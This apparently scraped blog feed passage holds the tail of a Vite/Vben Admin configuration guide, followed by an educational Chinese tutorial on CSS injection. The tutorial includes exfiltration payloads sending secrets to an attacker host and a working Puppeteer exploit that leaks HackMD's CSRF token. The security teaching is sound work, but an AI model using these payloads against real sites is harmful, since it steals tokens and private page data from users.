plugins; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configCompressPlugin } from \u0026#39;./compress\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // rollup-plugin-gzip vitePlugins.push(configCompressPlugin(VITE_BUILD_COMPRESS)); } return vitePlugins; } Vite插件-vite-plugin-pwa 說明 vite-plugin-pwa的npm首頁：PWA一些技術集成。 Service Worker-參考鏈接 PWA-MDN說明 B站-PWA黑馬公開課教學 安裝 1 yarn add vite-plugin-pwa --dev 配置插件 build/vite/plugin/pwa.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 /** * Zero-config PWA for Vite * https://github.com/antfu/vite-plugin-pwa */ import type { ViteEnv } from \u0026#39;../../utils\u0026#39;; import { VitePWA } from \u0026#39;vite-plugin-pwa\u0026#39;; export function configPwaConfig(env: ViteEnv) { const { VITE_USE_PWA, VITE_GLOB_APP_TITLE, VITE_GLOB_APP_SHORT_NAME } = env; if (VITE_USE_PWA) { // vite-plugin-pwa const pwaPlugin = VitePWA({ manifest: { name: VITE_GLOB_APP_TITLE, short_name: VITE_GLOB_APP_SHORT_NAME, icons: [ { // ./表示public文件夾 src: \u0026#39;./resource/img/pwa-192x192.png\u0026#39;, sizes: \u0026#39;192x192\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, { src: \u0026#39;./resource/img/pwa-512x512.png\u0026#39;, sizes: \u0026#39;512x512\u0026#39;, type: \u0026#39;image/png\u0026#39;, }, ], }, }); return pwaPlugin; } return []; } 配置Vite build/vite/plugin/index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // ... import { configPwaConfig } from \u0026#39;./pwa\u0026#39;; export function createVitePlugins(viteEnv: ViteEnv, isBuild: boolean, pkg: any) { // ... // The following plugins only work in the production environment if (isBuild) { // ... // vite-plugin-pwa vitePlugins.push(configPwaConfig(viteEnv)); } return vitePlugins; } Vite配置-optimizeDeps.include 說明 Vite配置-optimizedeps-include說明\n原文：\n類型： string[]\n默認情況下，不在 node_modules 中的，鏈接的包不會被預構建。使用此選項可強制預構建鏈接的包。\n安裝moment antd中需要使用moment。而moment配置和本章有關，所以就順便安裝一下：\n1 yarn add moment 配置Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // ... function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], // ... }, }; }; Vite配置-optimizeDeps.exclude 說明 Vite配置-optimizedeps-exclude說明\n原文：\n類型： string[]\n在預構建中強制排除的依賴項。\n配置Vite vite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 // ... export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { // ... return { // ... optimizeDeps: { // ... exclude: [\u0026#39;vue-demi\u0026#39;], }, }; }; http-server 說明 項目編譯之後的靜態文件是不能直接本地訪問的。因為本地訪問使用的是file:///協議。而file:///不支持跨域和一些其他特性。比如JavaScript模塊、PWA等等。\n那麼此時就需要換一種訪問本地文件的方式了，就是讓本地成為一個服務器。通過http來訪問。\nhttp-server就可以實現以http形式訪問本地文件的目的，但是這個依賴不保證安全，只用於本地測試。\nhttp-server的npm首頁：命令行啟動一個本地服務器。不安全，但是可以用來測試。\n安裝 1 yarn add http-server --dev 配置腳本 package.json 1 2 3 4 5 6 7 8 9 10 { // ... \u0026#34;scripts\u0026#34;: { // ... \u0026#34;test:gzip\u0026#34;: \u0026#34;http-server dist --cors --gzip -c-1\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;http-server dist --cors --brotli -c-1\u0026#34;, // ... }, // ... } ","date":"2022-10-12T00:00:00Z","image":"https://live.staticflickr.com/65535/52422113584_3af97c79da_o.png","permalink":"https://wayneblog.ga/2022-10-12/vben-admin-guide/","title":"Vben Admin 指南與 Vite 配置"},{"content":" 用 CSS 來偷資料 - CSS injection（上） 參考文章 用 CSS 來偷資料 - CSS injection - Huli CSS Injection Attacks CSS Injection Primitives HackTricks - CSS Injection Stealing Data in Great style – How to Use CSS to Attack Web Application. Data Exfiltration via CSS + SVG Font Data Exfiltration via CSS + SVG Font - PoC (Safari only) CSS data exfiltration in Firefox via a single injection point 前言 在講到針對網頁前端的攻擊時，你我的心中浮現的八成會是 XSS，但如果你沒辦法在網頁上執行 JavaScript，有沒有其他的攻擊手法呢？例如說，假設可以插入 style 標籤，你能夠做些什麼？\n在 2018 年的時候，我有寫過一篇 CSS keylogger：攻擊與防禦，那時剛好在 Hacker News 上面看到相關的討論，於是就花了點時間研究了一下。\n而 4 年後的現在，我從資安的角度重新認識了這個攻擊手法，因此打算寫一兩篇文章來好好講解 CSS injection。\n這篇的文章內容包含：\n什麼是 CSS injection？ CSS 偷資料的原理 如何偷 hidden input 的資料 如何偷 meta 的資料 承上，並以 HackMD 為例 什麼是 CSS injection？ 顧名思義，CSS injection 代表的是你在一個頁面上可以插入任何的 CSS 語法，或是講得更明確一點，你可以使用 \u0026lt;style\u0026gt; 這個標籤。你可能會好奇，為什麼會有這種狀況？\n我自己認為常見的狀況有兩個，第一個是網站有過濾掉許多標籤，但不覺得 \u0026lt;style\u0026gt; 有問題，所以沒有過濾掉。例如說很多網站都會用現成的 library 來處理 sanitization，其中有一套很有名的叫做 DOMPurify。\n在 DOMPurify(v2.4.0) 之中，預設就會幫你把各種危險的標籤全都過濾掉，只留下一些安全的，例如說 \u0026lt;h1\u0026gt; 或是 \u0026lt;p\u0026gt; 這種，而重點是 \u0026lt;style\u0026gt; 也在預設的安全標籤裡面，所以如果你沒有特別指定參數，在預設的狀況下，\u0026lt;style\u0026gt; 是不會被過濾掉的，因此攻擊者就可以注入 CSS。\n第二種狀況則是雖然可以插入 HTML，但是由於 CSP（Content Security Policy）的緣故，沒有辦法執行 JavaScript。既然沒辦法執行 JavaScript，就只能退而求其次，看看有沒有辦法利用 CSS 做出一些惡意行為。\n那到底有了 CSS injection 之後可以幹嘛？CSS 不是拿來裝飾網頁用的而已嗎？難道幫網頁的背景換顏色也可以是一個攻擊手法？\n利用 CSS 偷資料 CSS 確實是拿來裝飾網頁用的，但是只要結合兩個特性，就可以使用 CSS 來偷資料。\n第一個特性：屬性選擇器。\n在 CSS 當中，有幾個選擇器可以選到「屬性符合某個條件的元素」。舉例來說，input[value^=a]，就可以選到 value 開頭是 a 的元素。\n類似的選擇器有：\ninput[value^=a] 開頭是 a 的（prefix） input[value$=a] 結尾是 a 的（suffix） input[value*=a] 內容有 a 的（contains） 而第二個特性是：可以利用 CSS 發出 request，例如說載入一張伺服器上的背景圖片，本質上就是在發一個 request。\n假設現在頁面上有一段內容是 \u0026lt;input name=\u0026quot;secret\u0026quot; value=\u0026quot;abc123\u0026quot;\u0026gt;，而我能夠插入任何的 CSS，我可以這樣寫：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://myserver.com?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://myserver.com?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://myserver.com?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://myserver.com?q=z) } 會發生什麼事情？\n因為第一條規則有順利找到對應的元素，所以 input 的背景就會是一張伺服器上的圖片，而瀏覽器就會發 request 到 https://myserver.com?q=a。\n因此，當我在 server 收到這個 request 的時候，我就知道「input 的 value 屬性，第一個字元是 a」，就順利偷到了第一個字元。\n這就是 CSS 之所以可以偷資料的原因，透過屬性選擇器加上載入圖片這兩個功能，就能夠讓 server 知道頁面上某個元素的屬性值是什麼。\n好，現在確認 CSS 可以偷屬性的值了，接下來有兩個問題：\n有什麼東西好偷？ 你剛只示範偷第一個，要怎麼偷第二個字元？ 我們先來討論第一個問題，有哪些東西可以偷？通常都是要偷一些敏感資料對吧？\n最常見的目標，就是 CSRF token。如果你不知道什麼是 CSRF，可以先看看我之前寫過的這一篇：讓我們來談談 CSRF（話說我有打算寫新的 CSRF 系列文，拖稿中，想看的話可留言催稿）。\n簡單來說呢，如果 CSRF token 被偷走，就有可能會被 CSRF 攻擊，總之你就想成這個 token 很重要就是了。而這個 CSRF token，通常都會被放在一個 hidden input 中，像是這樣：\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 我們該怎麼偷到裡面的資料呢？\n偷 hidden input 對於 hidden input 來說，照我們之前那樣寫是沒有效果的：\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a) } 因為 input 的 type 是 hidden，所以這個元素不會顯示在畫面上，既然不會顯示，那瀏覽器就沒有必要載入背景圖片，因此 server 不會收到任何 request。而這個限制非常嚴格，就算用 display:block !important; 也沒辦法蓋過去。\n該怎麼辦呢？沒關係，我們還有別的選擇器，像是這樣：\n1 2 3 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;] + input { background: url(https://example.com?q=a) } 最後面多了一個 + input，這個加號是另外一個選擇器，意思是「選到後面的元素」，所以整個選擇器合在一起，就是「我要選 name 是 csrf-token，value 開頭是 a 的 input，的後面那個 input」，也就是 \u0026lt;input name=\u0026quot;username\u0026quot;\u0026gt;。\n所以，真正載入背景圖片的其實是別的元素，而別的元素並沒有 type=hidden，所以圖片會被正常載入。\n那如果後面沒有其他元素怎麼辦？像是這樣：\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;abc123\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 以這個案例來說，在以前就真的玩完了，因為 CSS 並沒有可以選到「前面的元素」的選擇器，所以真的束手無策。\n但現在不一樣了，因為我們有了 :has，這個選擇器可以選到「底下符合特殊條件的元素」，像這樣：\n1 2 3 form:has(input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;a\u0026#34;]){ background: url(https://example.com?q=a) } 意思就是我要選到「底下有（符合那個條件的 input）的 form」，所以最後載入背景的會是 form，一樣也不是那個 hidden input。這個 has selector 很新，從上個月底釋出的 Chrome 105 開始才正式支援，目前只剩下 Firefox 的穩定版還沒支援了，詳情可看：caniuse\n有了 has 以後，基本上就無敵了，因為可以指定改變背景的是哪個父元素，所以想怎麼選就怎麼選，怎樣都選得到。\n偷 meta 除了把資料放在 hidden input 以外，也有些網站會把資料放在 \u0026lt;meta\u0026gt; 裡面，例如說 \u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;abc123\u0026quot;\u0026gt;，meta 這個元素一樣是看不見的元素，要怎麼偷呢？\n首先，如同上個段落的結尾講的一樣，has 是絕對偷得到的，可以這樣偷：\n1 2 3 html:has(meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;]) { background: url(https://example.com?q=a); } 但除此之外，還有其他方式也偷得到。\nmeta 雖然也看不到，但跟 hidden input 不同，我們可以自己用 CSS 讓這個元素變成可見：\n1 2 3 4 5 6 7 meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } 可是這樣還不夠，你會發現 request 還是沒有送出，這是因為 meta 在 head 底下，而 head 也有預設的 display:none 屬性，因此也要幫 head 特別設置，才會讓 meta「能被看到」：\n1 2 3 4 5 6 7 head, meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } 照上面這樣寫，就會看到瀏覽器發出 request。不過，畫面上倒是沒有顯示任何東西，因為畢竟 content 是一個屬性，而不是 HTML 的 text node，所以不會顯示在畫面上，但是 meta 這個元素本身其實是看得到的，這也是為什麼 request 會發出去：\n如果你真的想要在畫面上顯示 content 的話，其實也做得到，可以利用偽元素搭配 attr：\n1 2 3 meta:before { content: attr(content); } 就會看到 meta 裡面的內容顯示在畫面上了。\n最後，讓我們來看一個實際案例。\n偷 HackMD 的資料 HackMD 的 CSRF token 放在兩個地方，一個是 hidden input，另一個是 meta，內容如下：\n1 \u0026lt;meta name=\u0026#34;csrf-token\u0026#34; content=\u0026#34;h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI\u0026#34;\u0026gt; 而 HackMD 其實支援 \u0026lt;style\u0026gt; 的使用，這個標籤不會被過濾掉，所以你是可以寫任何的 style 的，而相關的 CSP 如下：\n1 2 3 img-src * data:; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com; font-src \u0026#39;self\u0026#39; data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com; 可以看到 unsafe-inline 是允許的，所以可以插入任何的 CSS。\n確認可以插入 CSS 以後，就可以開始來準備偷資料了。還記得前面有一個問題沒有回答，那就是「該怎麼偷第一個以後的字元？」，我先以 HackMD 為例回答。\n首先，CSRF token 這種東西通常重新整理就會換一個，所以不能重新整理，而 HackMD 剛好支援即時更新，只要內容變了，會立刻反映在其他 client 的畫面上，因此可以做到「不重新整理而更新 style」，流程是這樣的：\n準備好偷第一個字元的 style，插入到 HackMD 裡面 受害者打開頁面 伺服器收到第一個字元的 request 從伺服器更新 HackMD 內容，換成偷第二個字元的 payload 受害者頁面即時更新，載入新的 style 伺服器收到第二個字元的 request 不斷循環直到偷完所有字元 簡單的示意圖如下：\n程式碼如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const express = require(\u0026#39;express\u0026#39;) const sleep = ms =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); // Create a hackMD document and let anyone can view/edit const noteUrl = \u0026#39;https://hackmd.io/1awd-Hg82fekACbL_ode3aasf\u0026#39; const host = \u0026#39;http://localhost:3000\u0026#39; const baseUrl = host + \u0026#39;/extract?q=\u0026#39; const port = process.env.PORT || 3000 ;(async function() { const app = express() const browser = await puppeteer.launch({ headless: true }); const page = await browser.newPage(); await page.setViewport({ width: 1280, height: 800 }) await page.setRequestInterception(true); page.on(\u0026#39;request\u0026#39;, request =\u0026gt; { const url = request.url() // cancel request to self if (url.includes(baseUrl)) { request.abort() } else { request.continue() } }); app.listen(port, () =\u0026gt; { console.log(`Listening at http://localhost:${port}`) console.log(\u0026#39;Waiting for server to get ready...\u0026#39;) startExploit(app, page) }) })() async function startExploit(app, page) { let currentToken = \u0026#39;\u0026#39; await page.goto(noteUrl + \u0026#39;?edit\u0026#39;); // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele await page.addStyleTag({ content: \u0026#34;{scroll-behavior: auto !important;}\u0026#34; }); const initialPayload = generateCss() await updateCssPayload(page, initialPayload) console.log(`Server is ready, you can open ${noteUrl}?view on the browser`) app.get(\u0026#39;/extract\u0026#39;, (req, res) =\u0026gt; { const query = req.query.q if (!query) return res.end() console.log(`query: ${query}, progress: ${query.length}/36`) currentToken = query if (query.length === 36) { console.log(\u0026#39;over\u0026#39;) return } const payload = generateCss(currentToken) updateCssPayload(page, payload) res.end() }) } async function updateCssPayload(page, payload) { await sleep(300) await page.click(\u0026#39;.CodeMirror-line\u0026#39;) await page.keyboard.down(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;A\u0026#39;); await page.keyboard.up(\u0026#39;Meta\u0026#39;); await page.keyboard.press(\u0026#39;Backspace\u0026#39;); await sleep(300) await page.keyboard.sendCharacter(payload) console.log(\u0026#39;Updated css payload, waiting for next request\u0026#39;) } function generateCss(prefix = \u0026#34;\u0026#34;) { const csrfTokenChars = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_\u0026#39;.split(\u0026#39;\u0026#39;) return ` ${prefix} \u0026lt;style\u0026gt; head, meta { display: block; } ${ csrfTokenChars.map(char =\u0026gt; ` meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;${prefix + char}\u0026#34;] { background: url(${baseUrl}${prefix + char}) } `).join(\u0026#39;\\n\u0026#39;) } \u0026lt;/style\u0026gt; ` } 可以直接用 Node.js 跑起來，跑起來以後在瀏覽器打開相對應的文件，就可以在 terminal 看到 leak 的進度。\n不過呢，就算偷到了 HackMD 的 CSRF token，依然還是沒辦法 CSRF，因為 HackMD 有在 server 檢查其他的 HTTP request header 如 origin 或是 referer 等等，確保 request 來自合法的地方。\n總結 在這篇裡面，我們看到了之所以可以用 CSS 來偷資料的原理，說穿了就是利用「屬性選擇器」再加上「載入圖片」這兩個簡單的功能，也示範了如何偷取 hidden input 跟 meta 裡的資料，並且以 HackMD當作實際案例說明。\n但是呢，有幾個問題我們還沒解決，像是：\nHackMD 因為可以即時同步內容，所以不需要重新整理就可以載入新的 style，那其他網站呢？該怎麼偷到第二個以後的字元？ 一次只能偷一個字元的話，是不是要偷很久呢？這在實際上可行嗎？ 有沒有辦法偷到屬性以外的東西？例如說頁面上的文字內容，或甚至是 JavaScript 的程式碼？ 針對這個攻擊手法的防禦方式有哪些？ 用 CSS 來偷資料 - CSS injection（下） 偷到所有字元 我們想偷的資料有可能只要重新整理以後就會改變（如 CSRF token），所以我們必須在不重新整理的狀況之下載入新的 style。\n前面之所以做得到，是因為 HackMD 本身就是一個標榜即時更新的文件，但如果是一般的網頁呢？在不能用 JavaScript 的情況下，該如何不斷動態載入新的 style？\n有關於這個問題，在 CSS Injection Attacks 這份簡報裡面給出了解答：@import。\n在 CSS 裡面，你可以用 @import 去把外部的其他 style 引入進來，就像 JavaScript 的 import 那樣。\n我們可以利用這個功能做出引入 style 的迴圈，如下面的程式碼：\n1 @import url(https://myserver.com/start?len=8) 接著，在 server 回傳如下的 style：\n1 2 3 4 5 6 7 8 @import url(https://myserver.com/payload?len=1) @import url(https://myserver.com/payload?len=2) @import url(https://myserver.com/payload?len=3) @import url(https://myserver.com/payload?len=4) @import url(https://myserver.com/payload?len=5) @import url(https://myserver.com/payload?len=6) @import url(https://myserver.com/payload?len=7) @import url(https://myserver.com/payload?len=8) 重點來了，這邊雖然一次引入了 8 個，但是「後面 7 個 request，server 都會先 hang 住，不會給 response」，只有第一個網址 https://myserver.com/payload?len=1 會回傳 response，內容為之前提過的偷資料 payload：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;c\u0026#34;] { background: url(https://b.myserver.com/leak?q=c) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;z\u0026#34;] { background: url(https://b.myserver.com/leak?q=z) } 當瀏覽器收到 response 的時候，就會先載入上面這一段 CSS，載入完以後符合條件的元素就會發 request 到後端，假設第一個字是 d 好了，接著 server 這時候才回傳 https://myserver.com/payload?len=2 的 response，內容為：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;da\u0026#34;] { background: url(https://b.myserver.com/leak?q=da) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;db\u0026#34;] { background: url(https://b.myserver.com/leak?q=db) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dc\u0026#34;] { background: url(https://b.myserver.com/leak?q=dc) } //.... input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;dz\u0026#34;] { background: url(https://b.myserver.com/leak?q=dz) } 以此類推，只要不斷重複這些步驟，就可以把所有字元都傳到 server 去，靠的就是 import 會先載入已經下載好的 resource，然後去等待還沒下載好的特性。\n這邊有一點要特別注意，你會發現我們載入 style 的 domain 是 myserver.com，而背景圖片的 domain 是 b.myserver.com，這是因為瀏覽器通常對於一個 domain 能同時載入的 request 有數量上的限制，所以如果你全部都是用 myserver.com 的話，會發現背景圖片的 request 送不出去，都被 CSS import 給卡住了。\n因此需要設置兩個 domain，來避免這種狀況。\n除此之外，上面這種方式在 Firefox 是行不通的，因為在 Firefox 上就算第一個的 response 先回來，也不會立刻更新 style，要等所有 request 都回來才會一起更新。解法的話可以參考這一篇：CSS data exfiltration in Firefox via a single injection point，把第一步的 import 拿掉，然後每一個字元的 import 都用額外的 style 包著，像這樣：\n1 2 3 4 5 6 7 8 \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=1)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=2)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=3)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=4)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=5)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=6)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=7)\u0026lt;/style\u0026gt; \u0026lt;style\u0026gt;@import url(https://myserver.com/payload?len=8)\u0026lt;/style\u0026gt; 而上面這樣 Chrome 也是沒問題的，所以統一改成上面這樣，就可以同時支援兩種瀏覽器了。\n總結一下，只要用 @import 這個 CSS 的功能，就可以做到「不重新載入頁面，但可以動態載入新的 style」，進而偷取後面的每一個字元。\n一次偷一個字元，太慢了吧？ 若是想要在現實世界中執行這種攻擊，效率可能要再更好一點。以 HackMD 為例，CSRF token 總共有 36 個字，所以就要發 36 個 request，確實是太多了點。\n事實上，我們一次可以偷兩個字元，因為上集有講過除了 prefix selector 以外，也有 suffix selector，所以可以像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } // ... input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;a\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=a) } input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;b\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=b) } 除了偷開頭以外，我們也偷結尾，效率立刻變成兩倍。要特別注意的是開頭跟結尾的 CSS，一個用的是 background，另一個用的是 border-background，是不同的屬性，因為如果用同一個屬性的話，內容就會被其他的蓋掉，最後只會發出一個 request。\n若是內容可能出現的字元不多，例如說 16 個的話，那我們可以直接一次偷兩個開頭加上兩個結尾，總共的 CSS rule 數量為 16*16*2 = 512 個，應該還在可以接受的範圍內，就能夠再加速兩倍。\n除此之外，也可以朝 server 那邊去改善，例如說改用 HTTP/2 或甚至是 HTTP/3，都有機會能夠加速 request 載入的速度，進而提升效率。\n偷其他東西 除了偷屬性之外，有沒有辦法偷到其他東西？例如說，頁面上的其他文字？或甚至是 script 裡面的程式碼？\n根據我們在上一篇裡面講的原理，是做不到的。因為能偷到屬性是因為「屬性選擇器」這個東西，才讓我們選到特定的元素，而在 CSS 裡面，並沒有可以選擇「內文」的選擇器。\n因此，我們需要對 CSS 以及網頁上的樣式有更深入的理解，才有辦法達成這件看似不可能的任務。\nunicode-range 在 CSS 裡面，有一個屬性叫做「unicode-range」，可以針對不同的字元，載入不同的字體。像是底下這個從 MDN 拿來的範例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;Ampersand\u0026#34;; src: local(\u0026#34;Times New Roman\u0026#34;); unicode-range: U+26; } div { font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Me \u0026amp; You = Us\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026amp; 的 unicode 是 U+0026，因此只有 \u0026amp; 這個字會用不同的字體來顯示，其他都用同一個字體。\n這招前端工程師可能有用過，例如說英文跟中文如果要用不同字體來顯示，就很適合用這一招。而這招也可以用來偷取頁面上的文字，像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;f1\u0026#34;; src: url(https://myserver.com?q=1); unicode-range: U+31; } @font-face { font-family: \u0026#34;f2\u0026#34;; src: url(https://myserver.com?q=2); unicode-range: U+32; } @font-face { font-family: \u0026#34;f3\u0026#34;; src: url(https://myserver.com?q=3); unicode-range: U+33; } @font-face { font-family: \u0026#34;fa\u0026#34;; src: url(https://myserver.com?q=a); unicode-range: U+61; } @font-face { font-family: \u0026#34;fb\u0026#34;; src: url(https://myserver.com?q=b); unicode-range: U+62; } @font-face { font-family: \u0026#34;fc\u0026#34;; src: url(https://myserver.com?q=c); unicode-range: U+63; } div { font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;ca31a\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果你去看 network tab，會看到一共發送了 4 個 request：\n藉由這招，我們可以得知頁面上有：13ac 這四個字元。\n而這招的侷限之處也很明顯，就是：\n我們不知道字元的順序為何 重複的字元也不會知道 但是從「載入字型」的角度下去思考怎麼偷到字元，著實帶給了許多人一個新的思考方式，並發展出各式各樣其他的方法。\n字體高度差異 + first-line + scrollbar 這招要解決的主要是上一招碰到的問題：「沒辦法知道字元順序」，然後這招結合了很多細節，步驟很多，要仔細聽了。\n首先，我們其實可以不載入外部字體，用內建的字體就能 leak 出字元。這要怎麼做到呢？我們要先找出兩組內建字體，高度會不同。\n例如有一個叫做「Comic Sans MS」的字體，高度就比另一個「Courier New」高。\n舉個例子，假設預設字體的高度是 30px，而 Comic Sans MS 是 45px 好了。那現在我們把文字區塊的高度設成 40px，並且載入字體，像這樣：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 30px; height: 40px; width: 100px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;DBC\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;ABC\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 就會在畫面上看到差異：\n很明顯 A 比其他字元的高度都高，而且根據我們的 CSS 設定，如果內容高度超過容器高度，會出現 scrollbar。雖然上面是截圖看不出來，但是下面的 ABC 有出現 scrollbar，而上面的 DBC 沒有。\n再者，我們其實可以幫 scrollbar 設定一個外部的背景：\n1 2 3 4 5 6 7 div::-webkit-scrollbar { background: blue; } div::-webkit-scrollbar:vertical { background: url(https://myserver.com?q=a); } 也就是說，如果 scrollbar 有出現，我們的 server 就會收到 request。如果 scrollbar 沒出現，就不會收到 request。\n更進一步來說，當我把 div 套用 “fa” 字體時，如果畫面上有 A，就會出現 scrollbar，server 就會收到 request。如果畫面上沒有 A，就什麼事情都不會發生。\n因此，我如果一直重複載入不同字體，那我在 server 就能知道畫面上有什麼字元，這點跟剛剛我們用 unicode-range 